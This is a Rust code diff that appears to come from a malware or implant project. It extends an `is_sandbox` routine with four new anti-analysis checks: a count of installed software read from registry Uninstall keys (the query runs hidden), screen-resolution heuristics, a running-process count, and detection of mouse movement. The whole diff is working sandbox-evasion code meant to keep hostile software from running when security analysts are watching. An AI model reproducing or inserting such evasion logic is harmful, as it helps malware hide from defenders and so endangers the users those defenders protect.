@@ -354,6 +354,10 @@ fn is_sandbox(cfg: &AntiAnalysisConfig) -> bool {
         || (cfg.check_usb_history && check_usb_history(cfg.min_usb_devices))
         || (cfg.check_test_signing && check_test_signing())
         || (cfg.check_delay_sandbox && check_delay_sandbox(cfg.delay_seconds))
+        || (cfg.check_installed_software && check_installed_software(cfg.min_installed_software))
+        || (cfg.check_screen_resolution && check_screen_resolution())
+        || (cfg.check_process_count && check_process_count(cfg.min_processes))
+        || (cfg.check_mouse_movement && check_mouse_movement(cfg.mouse_wait_seconds))
 }
 
 fn check_cpu_cores(min_cores: u32) -> bool {
@@ -665,4 +669,119 @@ fn check_delay_sandbox(delay_seconds: u32) -> bool {
     std::thread::sleep(std::time::Duration::from_secs(delay_seconds as u64));
     let elapsed = before.elapsed().as_secs();
     elapsed < (delay_seconds as u64).saturating_sub(1)
+}
+
+/// Check installed software count via registry Uninstall keys.
+/// Real machines typically have 50+ entries; sandboxes have very few.
+fn check_installed_software(min_count: u32) -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        let paths = [
+            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+            r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
+        ];
+        let mut total = 0u32;
+        for path in paths {
+            if let Ok(output) = std::process::Command::new("reg")
+                .args(["query", path])
+                .creation_flags(0x08000000)
+                .stdout(std::process::Stdio::piped())
+                .stderr(std::process::Stdio::null())
+                .output()
+            {
+                let text = String::from_utf8_lossy(&output.stdout);
+                total += text.lines()
+                    .filter(|l| l.trim().starts_with("HKEY_"))
+                    .count() as u32;
+            }
+        }
+        total < min_count
+    }
+    #[cfg(not(target_os = "windows"))]
+    { let _ = min_count; false }
+}
+
+/// Check screen resolution — sandboxes often use low/unusual resolutions like 1024x768.
+fn check_screen_resolution() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        extern "system" {
+            fn GetSystemMetrics(nIndex: i32) -> i32;
+        }
+        const SM_CXSCREEN: i32 = 0;
+        const SM_CYSCREEN: i32 = 1;
+        unsafe {
+            let w = GetSystemMetrics(SM_CXSCREEN);
+            let h = GetSystemMetrics(SM_CYSCREEN);
+            // Suspicious: exactly 1024x768, 800x600, or width < 1200
+            w < 1200 || h < 800 || (w == 1024 && h == 768)
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    { false }
+}
+
+/// Check running process count — real systems typically have 80+ processes.
+fn check_process_count(min_count: u32) -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        extern "system" {
+            fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
+            fn Process32FirstW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
+            fn Process32NextW(hSnapshot: *mut std::ffi::c_void, lppe: *mut [u8; 568]) -> i32;
+            fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
+        }
+        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+
+        unsafe {
+            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if snapshot == -1isize as *mut std::ffi::c_void {
+                return false;
+            }
+            let mut pe = [0u8; 568];
+            // dwSize at offset 0, u32
+            pe[0..4].copy_from_slice(&568u32.to_le_bytes());
+            let mut count = 0u32;
+            if Process32FirstW(snapshot, &mut pe) != 0 {
+                count += 1;
+                while Process32NextW(snapshot, &mut pe) != 0 {
+                    count += 1;
+                }
+            }
+            CloseHandle(snapshot);
+            count < min_count
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    { let _ = min_count; false }
+}
+
+/// Check for real mouse movement within a time window.
+/// If no cursor position change is detected, it's likely a sandbox with no user interaction.
+fn check_mouse_movement(wait_seconds: u32) -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        #[repr(C)]
+        struct POINT { x: i32, y: i32 }
+
+        extern "system" {
+            fn GetCursorPos(lpPoint: *mut POINT) -> i32;
+        }
+
+        unsafe {
+            let mut p1 = POINT { x: 0, y: 0 };
+            GetCursorPos(&mut p1);
+
+            std::thread::sleep(std::time::Duration::from_secs(wait_seconds as u64));
+
+            let mut p2 = POINT { x: 0, y: 0 };
+            GetCursorPos(&mut p2);
+
+            // No movement at all — likely automated
+            p1.x == p2.x && p1.y == p2.y
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    { let _ = wait_seconds; false }
 }
